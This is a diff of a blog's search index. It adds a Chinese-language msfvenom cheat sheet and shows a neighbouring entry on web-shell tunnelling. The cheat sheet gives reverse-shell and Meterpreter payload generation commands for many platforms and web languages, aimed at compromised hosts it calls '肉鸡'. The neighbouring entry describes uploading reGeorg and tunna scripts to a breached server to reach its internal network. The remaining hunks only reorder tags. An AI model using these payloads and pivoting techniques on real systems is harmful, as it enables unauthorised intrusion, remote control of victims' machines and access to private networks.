@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[msfvenom的常用命令]]></title>
+    <url>%2F2017%2F09%2F13%2Fmsfvenom%2F</url>
+    <content type="text"><![CDATA[如题 msfvenom的常用命令msfvenom正向（bind_tcp）是我们连接肉鸡，反向（reverse_tcp）是肉鸡连接我们。一般会使用反向payload，原因是正向连接会在肉鸡上开启一个端口，容易被发现。 Options:12345678910111213141516171819-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表) -e, –encoder [encoder] 指定需要使用的encoder（编码器） -a, –arch &lt; architecture&gt; 指定payload的目标架构 –platform &lt; platform&gt; 指定payload的目标平台 -s, –space &lt; length&gt; 设定有效攻击荷载的最大长度 -b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039; -i, –iterations &lt; count&gt; 指定payload的编码次数 -c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件 -x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板 -k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项 -o, –out &lt; path&gt; 保存payload -v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式 –shellest 最小化生成payload -h, –help 查看帮助选项 –help-formats 查看msf支持的输出格式列表 不同系统下生成木马的命令123456789101112131415161718192021222324252627282930313233Linuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elfWindowsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMacmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb PayloadsPHPmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php（测试未成功）ASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warScripting PayloadsPythonmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pymsfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBashmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerlmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl]]></content>
+      <categories>
+        <category>metasploit</category>
+      </categories>
+      <tags>
+        <tag>metasploit</tag>
+        <tag>msfvenom</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[脚本代理工具使用总结]]></title>
     <url>%2F2017%2F09%2F13%2FscriptProxy%2F</url>
     <content type="text"><![CDATA[如题 脚本代理工具使用总结理论：正向代理和反向代理 正向：我们发起请求，连接远程目标 反向：远程目标发起请求，绕过防火墙，连接我们的攻击机（需要有公网IP、端口） web脚本工具：reDuh（鼻祖，不太好用）使用方法： 内有客户端和服务端两个版本。先将服务端的文件上传到服务器上，尝试访问并记录链接。访问链接如上图则表明成功。然后打开客户端，将记录的链接放入，写入进行转发的端口号和要连接的目标机的IP（此时认为自己站在服务器上，如果输入127.0.0.1，则是连接服务器的某个端口），先点击start，然后点击Create。会将端口映射到自己电脑的指定端口。然后使用相应的程序连接自己本地的端口即可 tunna（不太好用）使用方法： 将webshells中的conn文件上传到服务器，访问文件如果是一片空格则证明成功了。 攻击机使用命令： python proxy.py -u 连接网址 -l 本地端口 -r 目标端口 -a 127.0.0.1 例：1python proxy.py -u http://192.168.20.54/uploads/scanGE/conn.php -l 2222 -r 3389 -a 192.168.5.136 则连接本地的2222相当于连接内网192.168.5.136的3389如果此时映射3389（假设对方不允许远程登录），则也可以成功连接。 如果只监听自己的2222，不指定对方端口，则需要配合代理软件（例如shadowsocks需要使用firefox的代理来配合） reGeorg+proxifier（或sc32.exe）（目前最好用的）原理： Proxifier可以让指定程序的流量全部走指定的端口，而reGeorgSocksProxy脚本可以将服务器映射到本地监听端口，则所有通过本地监听端口的流量就相当于是走了服务器，所以可以访问到服务器内网 使用方法： 将tunnel文件上传的服务器，访问文件网址，出现下图则证明成功攻击机上执行： python reGeorgSocksProxy -u 木马网址 -p 本地监听端口 例：1python reGeorgSocksProxy.py -u http://192.168.20.54/uploads/scanGE/tunnel.php -p 1234 使用Proxifier工具进行端口代理 打开proxifier端口代理工具——》Profile——》proxy Servers 添加一个 127.0.0.1 本地监听端口号 socket 5Proxifier——》Proxification Rules——》添加对应的程序（例如3389用mstsc）——》下面action选择刚刚添加的代理——》Target Ports 输入目标IP和端口（此时认为自己是服务器，如果是扫描器则不能输入IP和端口）——》打上对勾——》OK——》（如果不好用，可以指定端口和IP尝试一下）此时再使用刚刚选择的程序，则那个程序全部走指定流量，例如使用mstsc，输入内网机IP（此时自己站在服务器的视角），即可成功连接 也可以直接加载端口扫描器之类的进行内网扫描不使用Proxifier，也可以使用sc32.exe进行端口代理文件——》设置——》SOCKS设置——》SOCKS版本5——》确定新建——》mstsc.exe——》运行]]></content>
@@ -8,8 +20,8 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>端口转发</tag>
+        <tag>代理</tag>
       </tags>
   </entry>
   <entry>
@@ -20,8 +32,8 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>端口转发</tag>
+        <tag>代理</tag>
         <tag>ssocks</tag>
       </tags>
   </entry>
@@ -104,8 +116,8 @@
         <category>端口转发</category>
       </categories>
       <tags>
-        <tag>代理</tag>
         <tag>端口转发</tag>
+        <tag>代理</tag>
       </tags>
   </entry>
   <entry>
